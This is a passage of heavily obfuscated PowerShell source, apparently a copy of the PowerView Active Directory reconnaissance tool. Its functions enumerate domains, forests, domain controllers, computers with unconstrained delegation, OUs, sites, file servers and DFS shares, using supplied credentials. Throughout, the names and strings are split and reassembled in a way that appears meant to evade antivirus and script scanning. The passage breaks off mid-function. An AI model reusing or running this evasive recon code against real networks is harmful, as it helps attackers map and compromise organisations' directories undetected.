                if(${AD`S`pATH} -match ("{2}{0}{1}" -f 'DAP://','.+/.+','L')) {
                    ${s`E`ARchst`RING} = ''
                }
                else {
                    ${a`DsPa`TH} = ${ad`SPaTh}.("{1}{2}{0}"-f 'ring','Subs','t').Invoke(7)
                }
            }
            ${D`N} = ${Ad`Sp`Ath}
        }
    }
    else {
        if(${D`Oma`iN} -and (${d`O`MAIn}.("{0}{1}" -f'T','rim').Invoke() -ne "")) {
            ${DN} = "DC=$($Domain.Replace('.', ',DC='))"
        }
    }

    ${sEaR`CH`sTR`Ing} += ${Dn}
    &("{2}{0}{1}" -f'-Ve','rbose','Write') ('G'+'et'+'-'+'Doma'+'inSearcher '+'s'+'ea'+'rch '+'strin'+'g: '+"$SearchString")

    if(${C`RE`d`EnTIal}) {
        &("{2}{1}{0}"-f 'rbose','e-Ve','Writ') ("{3}{9}{2}{5}{8}{4}{0}{7}{1}{6}{10}"-f ' credential','for LD',' a','Usin','te','ltern','AP ','s ','a','g','connection')
        ${DomAI`Nob`J`e`Ct} = &("{0}{2}{1}"-f'New-O','ject','b') ("{2}{9}{0}{5}{4}{7}{3}{6}{1}{8}" -f 'toryServic','yEnt','Di','r','s','e','ector','.Di','ry','rec')(${sEArCHST`RI`NG}, ${CR`ED`en`TIAL}."u`SE`RnamE", ${cr`ED`ent`IAl}.("{3}{0}{2}{1}" -f 'tNetworkC','ential','red','Ge').Invoke()."P`AS`SWord")
        ${seA`Rch`ER} = &("{2}{3}{1}{0}" -f 't','c','New-','Obje') ("{2}{8}{5}{3}{4}{7}{1}{0}{6}{9}"-f 'e','irectoryS','System.','orySe','rvic','ect','ar','es.D','Dir','cher')(${dom`A`inoBJ`Ect})
    }
    else {
        ${sE`ARc`Her} = &("{0}{1}{2}"-f'New','-O','bject') ("{1}{4}{10}{5}{7}{2}{6}{8}{3}{0}{9}" -f'ea','Sy','toryServ','ctoryS','stem','ire','ice','c','s.Dire','rcher','.D')([ADSI]${seA`RC`H`S`TRInG})
    }

    ${S`EARCh`ER}."PA`geSize" = ${pa`Ge`s`IZe}
    ${s`e`ArCHER}."CA`chERESU`l`Ts" = ${fal`sE}
    ${sE`A`RcHEr}
}


filter GeT-`NetDO`MAIN {


    param(
        [Parameter(VAluefromPIpElINe=${T`RUe})]
        [String]
        ${dom`AIN},

        [Management.Automation.PSCredential]
        ${C`RedE`N`Tial}
    )

    if(${cr`Ed`ENtI`Al}) {

        &("{0}{1}{2}" -f 'Wr','ite-Ve','rbose') ("{9}{0}{4}{1}{8}{2}{6}{3}{5}{7}"-f 's','r','ential','r Ge','ing alternate c','t','s fo','-NetDomain','ed','U')

        if(!${doM`A`iN}) {
            
            ${d`omAin} = ${C`R`edential}.("{3}{1}{0}{4}{2}" -f'eden','etworkCr','l','GetN','tia').Invoke()."DoMa`in"
            &("{3}{2}{0}{4}{1}"-f 'e-','bose','rit','W','Ver') ('Ext'+'r'+'acted '+'d'+'omain '+"'$Domain' "+'from'+' '+'-'+'C'+'red'+'ential')
        }

        ${DoMA`iNC`OntExT} = &("{1}{0}{2}" -f'c','New-Obje','t') ("{7}{11}{3}{15}{14}{16}{0}{2}{8}{6}{9}{13}{5}{12}{4}{1}{10}{17}" -f 's','ctoryCont','.A','e','re','ry.D','tive','System.Dire','c','Direc','ex','ctoryS','i','to','ic','rv','e','t')(("{1}{0}" -f'omain','D'), ${dO`MaIn}, ${cR`EDe`NtiAL}."usE`RNAmE", ${C`RE`dEN`Tial}.("{1}{2}{6}{0}{5}{4}{3}" -f 'work','Ge','t','ntial','rede','C','Net').Invoke()."pas`S`WORD")

        try {
              (  &("{2}{1}{3}{0}"-f'e','ar','get-v','iAbL') ('S'+'4Cln'+'7') -vAluEO)::("{1}{0}"-f 'etDomain','G').Invoke(${dOmaiN`Co`NTEXt})
        }
        catch {
            &("{0}{2}{1}{3}" -f 'Write','erbo','-V','se') ('Th'+'e '+'spec'+'if'+'ied '+'dom'+'a'+'in '+'do'+'es '+"'$Domain' "+'no'+'t '+'e'+'xis'+'t, '+'coul'+'d'+' '+'no'+'t '+'b'+'e '+'con'+'t'+'acted, '+'ther'+'e '+(('isn'+'7xvt ')-CREpLaCe '7xv',[ChaR]39)+'a'+'n '+'ex'+'ist'+'ing '+'tru'+'st, '+'or'+' '+'t'+'he '+'specif'+'ied'+' '+'cre'+'dential'+'s '+'ar'+'e '+'in'+'v'+'alid.')
            ${nU`Ll}
        }
    }
    elseif(${dO`main}) {
        ${DOm`A`i`NcO`NText} = &("{0}{1}{2}" -f 'New-','Ob','ject') ("{1}{7}{0}{9}{4}{6}{2}{5}{3}{8}"-f 'ectorySer','Syste','y.','ctoryC','s.ActiveDir','Dire','ector','m.Dir','ontext','vice')(("{0}{1}"-f'Do','main'), ${d`omaIn})
        try {
             ( &("{0}{1}"-f'GC','I')  ('VAriAb'+'Le'+':s'+'4CL'+'n7'))."v`ALuE"::("{1}{0}" -f 'omain','GetD').Invoke(${domaInco`N`TE`xT})
        }
        catch {
            &("{0}{1}{2}{3}" -f'Wr','ite-','V','erbose') ('Th'+'e '+'sp'+'e'+'cified '+'d'+'om'+'ain '+"'$Domain' "+'do'+'es '+'not'+' '+'exi'+'s'+'t, '+'co'+'uld '+'no'+'t '+'be'+' '+'contac'+'t'+'e'+'d, '+'o'+'r '+'ther'+'e '+(('i'+'snzkh'+'t ') -REPLACE 'zkh',[CHar]39)+'a'+'n '+'e'+'xisting '+'t'+'rust.')
            ${nu`ll}
        }
    }
    else {
          ${s4Cl`N7}::("{0}{2}{1}{3}" -f'G','tCurrent','e','Domain').Invoke()
    }
}


filter geT`-NE`T`FOresT {


    param(
        [Parameter(vALUefrOMPIPEline=${t`RuE})]
        [String]
        ${FO`RESt},

        [Management.Automation.PSCredential]
        ${crE`D`eN`TIAL}
    )

    if(${Cred`e`Nt`IaL}) {

        &("{0}{3}{1}{2}" -f'Write-','bos','e','Ver') ("{0}{2}{6}{5}{4}{9}{10}{7}{8}{3}{1}" -f 'Using alt','-NetForest','ern','r Get','nti','te crede','a','f','o','a','ls ')

        if(!${fORE`sT}) {
            
            ${F`Ore`st} = ${cr`edEN`TiAl}.("{3}{0}{2}{1}" -f 'Network','ntial','Crede','Get').Invoke()."dO`Ma`in"
            &("{4}{2}{3}{1}{0}"-f 'bose','te-Ver','r','i','W') ('Extract'+'ed'+' '+'doma'+'in '+"'$Forest' "+'fro'+'m '+'-Cre'+'d'+'ential')
        }

        ${for`es`TCONTe`xt} = &("{2}{1}{0}"-f 't','Objec','New-') ("{8}{7}{5}{3}{2}{11}{9}{6}{0}{1}{4}{10}"-f 'ory','C','rectory.D','rvices.ActiveDi','ont','e','t','DirectoryS','System.','ec','ext','ir')(("{1}{0}"-f 'orest','F'), ${fO`R`eSt}, ${cREDEn`TI`AL}."UsE`RNa`Me", ${C`R`eDenTI`Al}.("{3}{5}{0}{1}{2}{4}"-f'Network','Cre','dentia','G','l','et').Invoke()."Pas`sw`orD")

        try {
            ${fO`Re`StOBJ`ECt} =  ${T`N8`CHz}::("{2}{1}{0}"-f 't','res','GetFo').Invoke(${foRe`sTCON`T`EXT})
        }
        catch {
            &("{2}{1}{0}{3}"-f '-Verbo','e','Writ','se') ('Th'+'e '+'sp'+'ecif'+'ied '+'for'+'est '+"'$Forest' "+'doe'+'s '+'n'+'ot '+'ex'+'i'+'st, '+'c'+'oul'+'d '+'no'+'t '+'b'+'e '+'con'+'tacte'+'d,'+' '+'th'+'ere '+(('isn4B'+'Rt ')  -REpLace '4BR',[chAr]39)+'an'+' '+'e'+'xi'+'sting '+'tr'+'ust, '+'o'+'r '+'th'+'e '+'sp'+'ecifie'+'d '+'credent'+'ia'+'ls '+'are'+' '+'invali'+'d'+'.')
            ${Nu`ll}
        }
    }
    elseif(${FO`R`esT}) {
        ${fo`REs`Tc`oNtEXT} = &("{3}{0}{1}{2}" -f'w','-Objec','t','Ne') ("{8}{9}{4}{2}{1}{0}{5}{6}{3}{7}" -f'i','rv','Se','ry.Directo','y','ces.ActiveDire','cto','ryContext','Syste','m.Director')(("{0}{1}{2}"-f 'Fo','res','t'), ${f`ore`st})
        try {
            ${FORes`T`ob`JEcT} =   (  &("{3}{2}{0}{1}"-f'ria','BlE','Et-Va','G')  tN8cHZ )."vAl`UE"::("{0}{2}{1}"-f 'Ge','rest','tFo').Invoke(${FOReSTc`o`Ntext})
        }
        catch {
            &("{1}{2}{0}"-f'bose','Write-V','er') ('The'+' '+'sp'+'ec'+'ifi'+'ed '+'for'+'es'+'t '+"'$Forest' "+'do'+'es '+'n'+'ot '+'e'+'xist'+', '+'c'+'ou'+'ld '+'not'+' '+'b'+'e '+'co'+'ntact'+'ed,'+' '+'or'+' '+'ther'+'e '+('i'+'s'+'nkT9t ')."Re`plAcE"(([chAr]107+[chAr]84+[chAr]57),[sTriNG][chAr]39)+'an'+' '+'exi'+'st'+'ing '+'trust'+'.')
            return ${nu`ll}
        }
    }
    else {
        
        ${fORE`StOBJ`ECt} =   (&("{4}{0}{2}{3}{1}"-f 'cH','item','i','ld','gET-')  ('VarIa'+'BLE'+':T'+'N8cHZ') )."vA`lue"::("{1}{3}{0}{2}"-f 'Fore','GetCurren','st','t').Invoke()
    }

    if(${F`O`R`estOBJect}) {
        
        ${forESt`s`id} = (&("{1}{0}{2}"-f 'w-O','Ne','bject') ("{0}{8}{1}{6}{4}{5}{3}{7}{2}"-f 'S','tem.Sec','nt','nc','.Pr','i','urity','ipal.NTAccou','ys')(${f`o`R`EsTOBJEct}."ROot`d`OMAiN",("{1}{0}" -f 'btgt','kr')))."T`Ra`NSlAtE"([System.Security.Principal.SecurityIdentifier])."vAl`UE"
        ${PA`R`TS} = ${ForE`st`sID} -Split "-"
        ${f`ORES`TsID} = ${Par`Ts}[0..$(${Pa`RTS}."L`En`gTH"-2)] -join "-"
        ${FoReS`T`Ob`j`Ect} | &("{0}{2}{1}"-f'A','ember','dd-M') ("{2}{1}{0}" -f 'erty','oteProp','N') ("{4}{0}{3}{1}{2}" -f'Doma','i','d','inS','Root') ${fORe`Sts`ID}
        ${F`OR`E`sTobj`ECT}
    }
}


filter G`e`T-`NETFO`Re`sTDOmain {


    param(
        [Parameter(vaLuEFrompiPEliNE=${t`RUe})]
        [String]
        ${fo`R`ESt},

        [Management.Automation.PSCredential]
        ${cre`d`EN`TIAL}
    )

    ${forE`S`T`OBJEct} = &("{2}{1}{0}" -f 'st','t-NetFore','Ge') -Forest ${FOr`e`st} -Credential ${c`REDENTi`AL}

    if(${f`o`ResTOBj`ect}) {
        ${F`ORestOBJ`e`ct}."dom`AinS"
    }
}


filter GE`T-neTDO`ma`I`N`c`oN`TROLLER {


    [CmdletBinding()]
    param(
        [Parameter(VALUEfRoMPIPeliNe=${tr`Ue})]
        [String]
        ${d`OM`AiN},

        [String]
        ${domaI`NcoNtroL`L`eR},

        [Switch]
        ${LD`AP},

        [Management.Automation.PSCredential]
        ${cReDe`N`Ti`Al}
    )

    if(${L`dAP} -or ${DOmA`IN`cont`RollEr}) {
        
        &("{3}{0}{2}{1}{4}"-f't-Ne','p','tCom','Ge','uter') -Domain ${Dom`Ain} -DomainController ${DOM`AiNcO`NTRoLL`ER} -Credential ${cR`eD`ENtiAl} -FullData -Filter (("{3}{6}{2}{0}{4}{7}{5}{1}" -f'40.1','.803:=8192)','ccountControl:1.2.8','(u','13556.','.4','serA','1'))
    }
    else {
        ${F`OUN`dDOMAiN} = &("{2}{0}{4}{1}{3}"-f 'NetD','ma','Get-','in','o') -Domain ${DOm`AiN} -Credential ${CrE`D`eNT`iaL}
        if(${F`oUNDDOmA`in}) {
            ${fO`UndD`oM`AIN}."DO`MAiN`conT`R`O`llErS"
        }
    }
}









function Get`-n`etCOM`PUTeR {


    [CmdletBinding()]
    Param (
        [Parameter(vAluEFrOMpipelInE=${tr`Ue})]
        [Alias({"{1}{2}{0}" -f 'me','Hos','tNa'})]
        [String]
        ${CoMPUT`ern`AME} = '*',

        [String]
        ${s`Pn},

        [String]
        ${O`PEratING`S`YsT`EM},

        [String]
        ${sE`RVIcEP`A`cK},

        [String]
        ${f`il`TeR},

        [Switch]
        ${P`RInTe`Rs},

        [Switch]
        ${P`ING},

        [Switch]
        ${fuLl`DaTa},

        [String]
        ${D`o`mAin},

        [String]
        ${do`ma`i`Nc`ontrOLL`Er},

        [String]
        ${ads`PA`TH},

        [String]
        ${S`ITenAMe},

        [Switch]
        ${uNC`o`N`strAin`ED},

        [ValidateRange(1,10000)]
        [Int]
        ${paGes`ize} = 200,

        [Management.Automation.PSCredential]
        ${c`R`EdenTial}
    )

    begin {
        
        ${com`pseArC`H`Er} = &("{0}{1}{4}{3}{2}" -f'Get-Do','m','er','earch','ainS') -Domain ${dO`mA`iN} -DomainController ${dom`AinC`onTroL`lER} -ADSpath ${A`dS`pAth} -PageSize ${PA`G`es`iZe} -Credential ${cR`ede`NTIAl}
    }

    process {

        if (${Com`p`Sear`c`Her}) {

            
            if(${unc`ONsTrAIN`eD}) {
                &("{2}{0}{1}"-f'erbos','e','Write-V') ("{5}{8}{10}{9}{7}{2}{6}{0}{1}{3}{4}" -f'eleg','a','ained','ti','on','Searching for computers with',' d','nstr',' f','r unco','o')
                ${fILT`Er} += ("{2}{6}{12}{4}{10}{9}{0}{7}{5}{1}{3}{8}{11}"-f '.840.113556.','03:','(userAc','=5','t','4.8','count','1.','2428','1.2','rol:','8)','Con')
            }
            
            if(${pr`int`ERs}) {
                &("{1}{2}{0}"-f'Verbose','Wr','ite-') ("{0}{2}{3}{1}{6}{4}{5}"-f 'Sea','ng f','r','chi',' p','rinters','or')
                
                ${f`ILTer} += ("{1}{3}{5}{4}{0}{2}"-f 'Queue','(ob',')','jectCat','ry=print','ego')
            }
            if(${s`pn}) {
                &("{0}{2}{1}" -f'Write','e','-Verbos') ('S'+'ea'+'r'+'ching '+'for'+' '+'c'+'omp'+'uter'+'s '+'w'+'ith '+'SPN'+': '+"$SPN")
                ${F`ilteR} += "(servicePrincipalName=$SPN)"
            }
            if(${OpERA`TinGSy`ST`Em}) {
                ${F`IL`TEr} += "(operatingsystem=$OperatingSystem)"
            }
            if(${sE`RV`IcE`pACk}) {
                ${filt`Er} += "(operatingsystemservicepack=$ServicePack)"
            }
            if(${Si`T`ENaMe}) {
                ${FIlt`Er} += "(serverreferencebl=$SiteName)"
            }

            ${Co`MpFILt`Er} = "(&(sAMAccountType=805306369)(dnshostname=$ComputerName)$Filter)"
            &("{3}{2}{0}{1}" -f 'Verbo','se','rite-','W') ('Get-Ne'+'t'+'C'+'om'+'puter '+'filte'+'r '+': '+"$CompFilter")
            ${C`OMPS`eA`Rch`Er}."FILt`ER" = ${Co`m`P`FiLter}
            if(-not ${FUlL`DA`TA}) {
                ${N`ULL} = ${c`OM`pseARch`Er}."pROp`erTiesTOlO`AD".("{1}{0}" -f 'dd','A').Invoke(("{1}{0}{2}" -f 'stna','dnsho','me'))
            }

            try {
                ForEach(${comPUTe`RRes`U`lt} in ${Co`MPseArcH`er}.("{2}{1}{0}"-f 'll','A','Find').Invoke()) {
                    if(${COM`P`U`TErrES`Ult}) {
                        ${uP} = ${tr`Ue}
                        if(${P`iNg}) {
                            ${u`p} = &("{0}{3}{2}{1}{4}"-f'Tes','onnect','C','t-','ion') -Count 1 -Quiet -ComputerName ${comPut`e`RrE`SUlt}."p`R`OPErTIEs"."d`NsHO`St`NamE"
                        }
                        if(${UP}) {
                            
                            if (${F`ULL`daTa}) {
                                
                                ${c`Omp`UtEr} = &("{5}{2}{0}{4}{3}{6}{1}"-f'A','y','rt-LD','o','PPr','Conve','pert') -Properties ${cOMpuTeR`R`E`SULT}."PRO`PeR`T`ies"
                                ${C`O`MPu`Ter}."pso`BJ`EcT"."Ty`pENAM`Es".("{0}{1}" -f'A','dd').Invoke(("{1}{4}{5}{2}{0}{3}" -f 'pu','Pow','ew.Com','ter','er','Vi'))
                                ${C`OMp`UtEr}
                            }
                            else {
                                
                                ${COmPU`T`er`R`eSULt}."pr`OpE`Rties"."Dn`s`hOsTnAmE"
                            }
                        }
                    }
                }

                ${CO`mp`sEarCh`er}.("{0}{1}"-f 'dispo','se').Invoke()
            }
            catch {
                &("{2}{0}{1}{3}{4}" -f'rite-Wa','rni','W','n','g') ('E'+'r'+'ror: '+"$_")
            }
        }
    }
}


function Get-`ADo`Bj`ECt {


    [CmdletBinding()]
    Param (
        [Parameter(vaLuEFrOMPIpELiNe=${t`RuE})]
        [String]
        ${S`Id},

        [String]
        ${NA`me},

        [String]
        ${SAmACcoun`TN`A`me},

        [String]
        ${D`OMA`IN},

        [String]
        ${d`OMAinco`NtrOlL`Er},

        [String]
        ${a`d`SPATH},

        [String]
        ${FI`l`Ter},

        [Switch]
        ${re`TU`RNrAW},

        [ValidateRange(1,10000)]
        [Int]
        ${p`AgeS`izE} = 200,

        [Management.Automation.PSCredential]
        ${crED`enT`IAL}
    )
    process {
        if(${S`iD} -and (-not ${d`Oma`in})) {
            
            try {
                ${n`AME} = &("{4}{1}{3}{0}{2}" -f 'dT','rt-S','oName','i','Conve') ${s`id}
                if(${N`AmE}) {
                    ${caNo`Ni`Cal} = &("{3}{2}{0}{4}{1}" -f'er','me','onv','C','t-ADNa') -ObjectName ${nA`me} -InputType ("{1}{0}" -f '4','NT') -OutputType ("{1}{2}{0}"-f'nonical','C','a')
                    if(${c`AN`oNICAL}) {
                        ${D`o`MAin} = ${cA`N`oNI`cAL}.("{0}{1}" -f 'sp','lit').Invoke("/")[0]
                    }
                    else {
                        &("{2}{0}{4}{1}{3}" -f'rite-Ve','bos','W','e','r') ('Error'+' '+'resol'+'vin'+'g '+'SID'+' '+"'$SID'")
                        return ${n`Ull}
                    }
                }
            }
            catch {
                &("{1}{3}{0}{2}" -f 'o','Write-Ver','se','b') ('Err'+'or '+'reso'+'l'+'vi'+'ng '+'SI'+'D '+"'$SID' "+': '+"$_")
                return ${n`Ull}
            }
        }

        ${OBJE`Ctse`ARChEr} = &("{0}{3}{4}{2}{1}{5}" -f 'Get','c','inSear','-D','oma','her') -Domain ${do`maiN} -DomainController ${D`o`M`AiNCO`N`TROller} -Credential ${CR`EDEnt`i`Al} -ADSpath ${adsPA`Th} -PageSize ${PAgEs`I`ze}

        if(${O`BjEcTsea`R`Ch`Er}) {
            if(${S`iD}) {
                ${O`BjE`ct`Se`ARCHER}."f`ILTEr" = "(&(objectsid=$SID)$Filter)"
            }
            elseif(${Na`Me}) {
                ${OBJ`ECTSE`Ar`CHer}."fi`LTER" = "(&(name=$Name)$Filter)"
            }
            elseif(${S`AmA`ccOUnt`Name}) {
                ${o`BjEc`T`seA`RchEr}."f`Il`Ter" = "(&(samAccountName=$SamAccountName)$Filter)"
            }

            try {
                ${r`ESUL`Ts} = ${oB`J`e`cTseAR`chER}.("{0}{1}{2}" -f'Fi','nd','All').Invoke()
                ${re`SuL`Ts} | &("{1}{2}{0}"-f'-Object','Whe','re') {${_}} | &("{3}{0}{1}{2}"-f 'rE','ach','-Object','Fo') {
                    if(${r`ETuRn`R`AW}) {
                        ${_}
                    }
                    else {
                        
                        &("{1}{2}{0}{4}{5}{3}" -f't','Co','nver','rty','-','LDAPPrope') -Properties ${_}."pROpe`RTI`ES"
                    }
                }
                ${re`su`lts}.("{2}{0}{1}"-f'isp','ose','d').Invoke()
            }
            catch {
                &("{0}{1}{2}" -f'Wr','ite-','Verbose') ("{6}{5}{0}{1}{2}{3}{4}{7}"-f 'di','ng the',' ','s','ear','uil','Error b','cher object!')
            }
            ${O`BJecTS`ear`cHeR}.("{1}{2}{0}" -f 'se','disp','o').Invoke()
        }
    }
}


function GE`T`-`NETou {


    [CmdletBinding()]
    Param (
        [Parameter(VaLUEFroMpipeline=${T`RuE})]
        [String]
        ${OU`N`AME} = '*',

        [String]
        ${Gu`id},

        [String]
        ${D`OMa`iN},

        [String]
        ${DO`mai`NCONTRO`Ller},

        [String]
        ${ad`sP`ATh},

        [Switch]
        ${FuLLd`ATa},

        [ValidateRange(1,10000)]
        [Int]
        ${P`Ag`EsIZE} = 200,

        [Management.Automation.PSCredential]
        ${cR`e`DEntIAL}
    )

    begin {
        ${oUse`ArCH`eR} = &("{0}{3}{1}{2}" -f 'Get-DomainSea','ch','er','r') -Domain ${DoM`A`iN} -DomainController ${D`o`MaIN`co`NTr`OLLEr} -Credential ${c`REdEn`TI`AL} -ADSpath ${Ads`P`AtH} -PageSize ${P`AGe`sIzE}
    }
    process {
        if (${Ous`e`ArChER}) {
            if (${g`Uid}) {
                
                ${oU`SeARch`Er}."fi`LTer"="(&(objectCategory=organizationalUnit)(name=$OUName)(gplink=*$GUID*))"
            }
            else {
                ${o`UsEaR`c`hEr}."Fi`LTEr"="(&(objectCategory=organizationalUnit)(name=$OUName))"
            }

            try {
                ${r`eSults} = ${Ou`SEa`RcH`er}.("{1}{0}"-f'll','FindA').Invoke()
                ${res`UL`Ts} | &("{1}{3}{2}{0}" -f'ct','Wh','-Obje','ere') {${_}} | &("{2}{1}{0}" -f '-Object','Each','For') {
                    if (${F`UllDA`TA}) {
                        
                        ${O`U} = &("{0}{4}{2}{3}{1}" -f 'Conve','y','PProper','t','rt-LDA') -Properties ${_}."p`ROPEr`TI`ES"
                        ${Ou}."p`S`OBjeCt"."tYp`enam`ES".("{1}{0}" -f'dd','A').Invoke(("{1}{2}{0}"-f 'OU','Power','View.'))
                        ${oU}
                    }
                    else {
                        
                        ${_}."p`ROp`eRT`IeS"."a`D`SPaTH"
                    }
                }
                ${RE`s`ULtS}.("{1}{2}{0}" -f'pose','di','s').Invoke()
                ${Ouse`ARc`heR}.("{0}{1}"-f 'di','spose').Invoke()
            }
            catch {
                &("{4}{1}{0}{3}{2}"-f '-Warn','te','g','in','Wri') ${_}
            }
        }
    }
}


function gEt-`Net`SITe {


    [CmdletBinding()]
    Param (
        [Parameter(valUEfROMpIPElInE=${T`RUE})]
        [String]
        ${s`ITeNA`ME} = "*",

        [String]
        ${d`O`mAIN},

        [String]
        ${D`OmaInconTrO`l`LER},

        [String]
        ${A`D`sPath},

        [String]
        ${G`Uid},

        [Switch]
        ${fuL`lda`Ta},

        [ValidateRange(1,10000)]
        [Int]
        ${pAg`E`sIZE} = 200,

        [Management.Automation.PSCredential]
        ${cr`edE`NtiAL}
    )

    begin {
        ${S`iTESE`ArC`Her} = &("{0}{3}{2}{4}{5}{1}"-f'Get-Do','cher','e','mainS','a','r') -ADSpath ${a`DSp`Ath} -Domain ${d`O`MAIN} -DomainController ${d`omA`i`NcONTrOlLEr} -Credential ${c`RE`dentIal} -ADSprefix ("{6}{5}{2}{4}{7}{3}{0}{1}" -f'=Configurati','on','=','N','S','N','C','ites,C') -PageSize ${P`AG`E`sIZE}
    }
    process {
        if(${sIT`eS`eArcH`er}) {

            if (${G`Uid}) {
                
                ${sIT`EseaRCH`Er}."Fil`Ter"="(&(objectCategory=site)(name=$SiteName)(gplink=*$GUID*))"
            }
            else {
                ${S`I`TE`SeArcheR}."F`IlT`eR"="(&(objectCategory=site)(name=$SiteName))"
            }

            try {
                ${reSUL`TS} = ${SIT`E`SEA`RchEr}.("{0}{1}"-f 'F','indAll').Invoke()
                ${re`SuL`TS} | &("{2}{1}{0}{3}"-f'O','-','Where','bject') {${_}} | &("{4}{1}{3}{2}{0}" -f 't','orE','bjec','ach-O','F') {
                    if (${Fu`L`lDAtA}) {
                        
                        ${s`ITe} = &("{1}{3}{2}{0}"-f'erty','Convert-LD','Prop','AP') -Properties ${_}."pRO`P`E`RtIES"
                        ${SI`Te}."P`soBj`Ect"."TY`pena`mEs".("{1}{0}"-f 'dd','A').Invoke(("{1}{0}{3}{2}" -f 'erV','Pow','ite','iew.S'))
                        ${SI`TE}
                    }
                    else {
                        
                        ${_}."PrO`PER`TieS"."n`AMe"
                    }
                }
                ${RESU`LTs}.("{1}{0}" -f'ispose','d').Invoke()
                ${SIteSEa`RC`hER}.("{0}{1}"-f'dis','pose').Invoke()
            }
            catch {
                &("{0}{1}{2}"-f 'Write-','Verbos','e') ${_}
            }
        }
    }
}


function G`eT-doMai`NS`Id {


    param(
        [String]
        ${do`M`AiN},

        [String]
        ${DOm`AiNco`N`TRolLeR}
    )

    ${cO`MPuTers`EA`RC`HER} = &("{1}{4}{2}{0}{3}" -f 'earc','Get-Domai','S','her','n') -Domain ${t`A`RgetDOM`AiN} -DomainController ${domAI`NconTro`l`leR}
    ${C`OMpUTe`R`SE`AR`cHeR}."fIL`T`ER" = (("{3}{6}{5}{4}{2}{0}{1}" -f '9',')','6','(sAMAccou','3','e=805306','ntTyp'))
    ${NU`ll} = ${c`Om`Pu`T`ERSeArcHER}."pro`pERTIEsTOLo`AD".("{1}{0}"-f 'd','Ad').Invoke(("{1}{2}{0}" -f'id','obje','cts'))
    ${RE`sUlT} = ${cOM`pUtersEArC`h`ER}.("{0}{1}{2}" -f 'Fi','n','dOne').Invoke()

    if(-not ${r`EsuLt}) {
        &("{4}{1}{2}{3}{0}"-f'se','rite-','Ve','rbo','W') ("{0}{2}{7}{1}{3}{8}{5}{6}{4}" -f'G','S','et-D','ID: no ','ieved',' re','tr','omain','results')
    }
    else {
        ${DC`oB`JEcT} = &("{3}{0}{4}{6}{5}{2}{1}" -f 'rt','y','opert','Conve','-LD','PPr','A') -Properties ${Re`Su`lT}."pRopE`R`TiEs"
        ${d`Cs`ID} = ${dCO`Bje`cT}."ob`jec`TSID"
        ${DCS`id}.("{1}{2}{0}"-f 'bstring','S','u').Invoke(0, ${d`C`SID}.("{2}{3}{0}{1}" -f'xO','f','L','astInde').Invoke('-'))
    }
}


function G`eT-N`etFI`LE`s`eRver {


    [CmdletBinding()]
    param(
        [String]
        ${dOm`AIn},

        [String]
        ${DoMA`IN`co`Ntro`Ll`eR},

        [ValidateRange(1,10000)]
        [Int]
        ${p`A`geSizE} = 200,

        [Management.Automation.PSCredential]
        ${CrE`DEnt`iAl}
    )

    function sP`lIt-p`ATh {
        
        param([String]${pA`Th})

        if (${pA`TH} -and (${pa`Th}.("{1}{0}"-f'lit','sp').Invoke("\\")."Co`UnT" -ge 3)) {
            ${te`Mp} = ${P`AtH}.("{1}{0}"-f't','spli').Invoke("\\")[2]
            if(${T`emp} -and (${TE`mp} -ne '')) {
                ${Te`MP}
            }
        }
    }

    ${U`sErsE`A`RcheR} = &("{4}{1}{2}{3}{0}"-f 'her','-','DomainS','earc','Get') -Domain ${doMa`in} -DomainController ${DOMa`Incontr`oLl`Er} -Credential ${Cr`edeNtI`Al} -PageSize ${pa`GeS`IZe}

    
    ${userSea`R`CHEr}."FI`lter" = (((("{16}{10}{7}{3}{4}{15}{6}{18}{5}{17}{9}{13}{14}{11}{1}{2}{12}{8}{0}"-f')','i','pt','tType','=805306','medire','t','oun','=*))','*','samAcc','cr','path=*)(profilepath',')(','s','368)(s','(&(','ctory=','R(ho'))-rEpLACe  ([ChAR]115+[ChAR]116+[ChAR]82),[ChAR]124))

    
    ${U`SE`Rsearc`HER}."PRO`p`ERtIes`TOLo`Ad".("{1}{2}{0}"-f'dRange','A','d').Invoke((("{1}{3}{4}{0}{2}"-f'c','ho','tory','medi','re'), ("{1}{0}{2}"-f 'criptp','s','ath'), ("{1}{2}{0}"-f'th','profi','lepa')))

    
    &("{1}{3}{2}{0}"-f'bject','So','O','rt-') -Unique -InputObject $(ForEach(${us`ErREsu`Lt} in ${u`SERs`EarC`heR}.("{1}{2}{0}"-f 'l','F','indAl').Invoke()) {if(${UsErRE`S`Ult}."Pr`o`PertiES"[("{1}{0}{3}{2}{4}" -f 'dir','home','t','ec','ory')]) {&("{0}{1}{2}" -f 'S','p','lit-Path')(${US`e`Rresu`lT}."pROPe`Rti`ES"[("{1}{2}{0}"-f'rectory','hom','edi')])}if(${USEr`R`eSuLT}."p`ROpE`RtieS"[("{1}{0}{3}{2}"-f'ri','sc','path','pt')]) {&("{0}{1}{2}" -f'Sp','l','it-Path')(${USE`RR`ESult}."ProP`ERt`IEs"[("{3}{0}{1}{2}"-f'cript','pat','h','s')])}if(${Us`ERrE`SU`lt}."Pr`O`PE`RTIEs"[("{2}{1}{3}{0}"-f'h','ile','prof','pat')]) {&("{2}{1}{0}" -f 'it-Path','l','Sp')(${uSERR`eS`ULt}."pr`OP`ER`TIES"[("{3}{0}{2}{1}" -f 'of','th','ilepa','pr')])}})
}


function G`Et`-DfSsha`RE {


    [CmdletBinding()]
    param(
        [String]
        [ValidateSet("All","V1","1","V2","2")]
        ${ve`RS`iON} = "All",

        [String]
        ${dO`Main},

        [String]
        ${d`o`maINCOn`T`Roller},

        [String]
        ${A`dspAtH},

        [ValidateRange(1,10000)]
        [Int]
        ${paGE`S`iZe} = 200,

        [Management.Automation.PSCredential]
        ${crEd`EN`TI`Al}
    )

    function pAR`se`-p`kT {
        [CmdletBinding()]
        param(
            [byte[]]
            ${P`Kt}
        )

        ${B`in} = ${P`kT}
        ${B`l`ob_VeRsIon} =  ( &("{1}{0}{2}" -f'I','GET-var','ABle')  WxmO )."v`AlUE"::"Tou`INt`32"(${b`IN}[0..3],0)
        ${BLob_ELe`mEnt`_c`oUNT} =   (  &("{0}{1}{2}"-f'v','A','rIAblE')  WXMO -ValuE  )::"tO`Ui`Nt32"(${b`IN}[4..7],0)
        ${o`FFSeT} = 8
        
        ${oBJe`cT_lI`ST} = @()
        for(${I}=1; ${i} -le ${bl`o`B_ELeM`ENT_C`oUnt}; ${I}++){
               ${BL`OB_N`Ame_`s`izE_STaRT} = ${OfFs`Et}
               ${B`l`OB_Nam`e_sIzE`_eNd} = ${oF`F`Set} + 1
